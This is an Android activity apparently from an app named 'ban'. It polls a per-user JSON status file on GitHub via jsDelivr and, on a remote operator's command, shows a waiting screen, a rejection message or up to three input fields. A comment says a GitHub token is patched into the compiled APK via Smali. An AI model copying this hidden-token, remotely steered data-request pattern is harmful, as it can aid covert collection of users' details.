package com.ban.ab;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;

import org.json.JSONObject;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String GITHUB_TOKEN = ""; // يتم حقنه عبر Smali
    private final String GITHUB_REPO_PATH = "abdullah14120/ban";
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutFields;
    private LinearLayout groupField1, groupField2, groupField3;
    private TextView txtRejectReason, txtUserDisplay;
    private EditText field1, field2, field3;
    private Button btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder, btnCancelOrder;

    private long startTime;
    private final long TIMEOUT_LIMIT = 15 * 60 * 1000; // 15 دقيقة بالملي ثانية
    private Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        userName = pref.getString("user_name", "");
        startTime = System.currentTimeMillis(); // تسجيل وقت دخول واجهة الانتظار

        initViews();
        startAutoRefresh(); // بدء الفحص الدوري للحالة
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        txtUserDisplay = findViewById(R.id.txtUserDisplay);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        field1 = findViewById(R.id.field1);
        field2 = findViewById(R.id.field2);
        field3 = findViewById(R.id.field3);
        btnConfirm1 = findViewById(R.id.btnConfirm1);
        btnConfirm2 = findViewById(R.id.btnConfirm2);
        btnConfirm3 = findViewById(R.id.btnConfirm3);
        btnFinalOrder = findViewById(R.id.btnFinalOrder);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);
        groupField1 = findViewById(R.id.groupField1);
        groupField2 = findViewById(R.id.groupField2);
        groupField3 = findViewById(R.id.groupField3);

        txtUserDisplay.setText("مرحباً: " + userName);

        btnCancelOrder.setOnClickListener(v -> {
            stopAutoRefresh();
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override
            public void run() {
                checkStatusFromGithub();
                // إعادة الفحص كل 12 ثانية (توازن بين السرعة واستهلاك البطارية)
                refreshHandler.postDelayed(this, 12000);
            }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void stopAutoRefresh() {
        if (refreshHandler != null && refreshRunnable != null) {
            refreshHandler.removeCallbacks(refreshRunnable);
        }
    }

    private void checkStatusFromGithub() {
    // نستخدم jsDelivr مع إضافة وقت النظام لضمان عدم التخزين
    String url = "https://cdn.jsdelivr.net/gh/abdullah14120/ban@main/commands/" + userName + ".json?v=" + System.currentTimeMillis();

    Request request = new Request.Builder().url(url).build();

    client.newCall(request).enqueue(new Callback() {
        @Override
        public void onFailure(Call call, IOException e) {}

        @Override
        public void onResponse(Call call, Response response) throws IOException {
            if (response.isSuccessful() && response.body() != null) {
                try {
                    String decodedContent = response.body().string();
                    JSONObject statusObj = new JSONObject(decodedContent);
                    String status = statusObj.optString("status", "waiting");

                    runOnUiThread(() -> updateUI(status, statusObj));
                } catch (Exception e) { e.printStackTrace(); }
            }
        }
    });
    }

    private void updateUI(String status, JSONObject data) {
        long currentTime = System.currentTimeMillis();
        
        // فحص الرد الآلي (15 دقيقة بدون استجابة)
        if (status.equals("waiting") && (currentTime - startTime > TIMEOUT_LIMIT)) {
            showLayout(layoutRejected);
            txtRejectReason.setText("نأسف لا يمكننا خدمتك لعدم توفر أحد من فريق الدعم الفني حالياً، يرجى المحاولة لاحقاً.");
            stopAutoRefresh(); // التوقف عن استنزاف البيانات بعد الرفض الآلي
            return;
        }

        switch (status) {
            case "waiting":
                showLayout(layoutWaiting);
                break;
            case "rejected":
                showLayout(layoutRejected);
                txtRejectReason.setText(data.optString("reason", "تم رفض الطلب يدوياً."));
                stopAutoRefresh();
                break;
            case "fields":
                showLayout(layoutFields);
                setupFields(data);
                break;
        }
    }

    // دالة مساعدة لتبديل الواجهات بسلاسة في الخيط الرئيسي
    private void showLayout(View targetLayout) {
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutFields.setVisibility(View.GONE);
        targetLayout.setVisibility(View.VISIBLE);
    }

    private void setupFields(JSONObject data) {
        groupField1.setVisibility(data.has("f1") ? View.VISIBLE : View.GONE);
        groupField2.setVisibility(data.has("f2") ? View.VISIBLE : View.GONE);
        groupField3.setVisibility(data.has("f3") ? View.VISIBLE : View.GONE);
        btnFinalOrder.setVisibility(View.VISIBLE);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopAutoRefresh(); // ضمان توقف المزامنة عند إغلاق التطبيق
    }
}
